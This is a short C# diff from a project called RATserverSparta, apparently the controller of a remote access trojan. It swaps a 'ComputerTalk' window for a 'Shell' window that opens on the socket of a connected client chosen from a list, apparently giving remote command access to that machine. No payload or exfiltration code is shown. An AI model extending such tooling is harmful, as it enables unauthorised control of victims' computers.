@@ -4,6 +4,7 @@ using RATserverSparta.Socket;
 using RATserverSparta.Sockets;
 using RATserverSparta.Tools.Chat;
 using RATserverSparta.Tools.Screen;
+using RATserverSparta.Tools.Shell;
 using RATserverSparta.Tools.Talk;
 using System;
 using System.Collections.Generic;
@@ -145,8 +146,8 @@ namespace RATserverSparta
                 string SelectedClientString = ClientsList.SelectedItems[ClientsList.SelectedItems.Count - 1].Text;
                 System.Net.Sockets.Socket SelectedClientSocket = this.SocketAcceptClassInstance.ClientSocketMap[SelectedClientString];
 
-                ComputerTalk ComputerSpeech = new ComputerTalk(SelectedClientSocket);
-                ComputerSpeech.Show();
+                Shell Shell = new Shell(SelectedClientSocket);
+                Shell.Show();
             }
         }
 
